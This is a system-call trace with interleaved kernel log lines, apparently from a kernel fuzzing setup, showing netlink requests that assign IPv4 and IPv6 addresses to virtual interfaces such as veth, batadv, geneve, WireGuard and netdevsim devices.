[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x28\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x3b\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth1_to_batadv&quot;, ifr_ifindex=42}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x2a\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x3c\x08\x00\x01\x00\xac\x14\x14\x3c&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth1_to_batadv&quot;, ifr_ifindex=42}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x2a\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3c\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3c&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth1_to_batadv&quot;, ifr_ifindex=42}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x2a\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x3c\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;batadv_slave_0&quot;, ifr_ifindex=41}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x29\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x3d\x08\x00\x01\x00\xac\x14\x14\x3d&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;batadv_slave_0&quot;, ifr_ifindex=41}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x29\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3d\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3d&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;batadv_slave_0&quot;, ifr_ifindex=41}) = 0
[   77.768659][ T5086] veth0_macvtap: entered promiscuous mode
[   77.793525][ T5086] veth1_macvtap: entered promiscuous mode
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x29\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x3d\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;batadv_slave_1&quot;, ifr_ifindex=43}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x2b\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x3e\x08\x00\x01\x00\xac\x14\x14\x3e&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;batadv_slave_1&quot;, ifr_ifindex=43}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x2b\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3e\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3e&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;batadv_slave_1&quot;, ifr_ifindex=43}) = 0
[pid  5086] close(4)                    = 0
[   77.853052][ T5086] batman_adv: batadv0: Interface activated: batadv_slave_0
[   77.861796][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): macvtap0: link becomes ready
[   77.875369][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): macsec0: link becomes ready
[   77.883665][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): batadv_slave_0: link becomes ready
[   77.892541][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth0_to_batadv: link becomes ready
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x2b\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x3e\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;geneve0&quot;, ifr_ifindex=65}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x41\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x3f\x08\x00\x01\x00\xac\x14\x14\x3f&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;geneve0&quot;, ifr_ifindex=65}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x41\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3f\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x3f&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;geneve0&quot;, ifr_ifindex=65}) = 0
[pid  5086] close(4)                    = 0
[   77.917434][ T5086] batman_adv: batadv0: Interface activated: batadv_slave_1
[   77.925245][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): batadv_slave_1: link becomes ready
[   77.935217][ T1120] IPv6: ADDRCONF(NETDEV_CHANGE): veth1_to_batadv: link becomes ready
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x41\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x3f\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;geneve1&quot;, ifr_ifindex=66}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x42\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x40\x08\x00\x01\x00\xac\x14\x14\x40&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;geneve1&quot;, ifr_ifindex=66}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x42\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;geneve1&quot;, ifr_ifindex=66}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x42\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0a\x00\x01\x00\xaa\xaa\xaa\xaa\xaa\x40\x00\x00&quot;], 44, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 44
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=44, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;wg0&quot;, ifr_ifindex=25}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x19\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x41\x08\x00\x01\x00\xac\x14\x14\x41&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;wg0&quot;, ifr_ifindex=25}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x19\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x41\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x41&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;wg0&quot;, ifr_ifindex=25}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x19\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00&quot;], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;wg1&quot;, ifr_ifindex=26}) = 0
[pid  5086] close(4)                    = 0
[   77.962162][ T5086] netdevsim netdevsim0 netdevsim0: set [1, 0] type 2 family 0 port 6081 - 0
[   77.971080][ T5086] netdevsim netdevsim0 netdevsim1: set [1, 0] type 2 family 0 port 6081 - 0
[   77.980105][ T5086] netdevsim netdevsim0 netdevsim2: set [1, 0] type 2 family 0 port 6081 - 0
[   77.988901][ T5086] netdevsim netdevsim0 netdevsim3: set [1, 0] type 2 family 0 port 6081 - 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x1a\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x42\x08\x00\x01\x00\xac\x14\x14\x42&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;wg1&quot;, ifr_ifindex=26}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x1a\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x42\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x42&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;wg1&quot;, ifr_ifindex=26}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x1a\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00&quot;], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;wg2&quot;, ifr_ifindex=27}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x1b\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x43\x08\x00\x01\x00\xac\x14\x14\x43&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;wg2&quot;, ifr_ifindex=27}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x1b\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x43\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x43&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
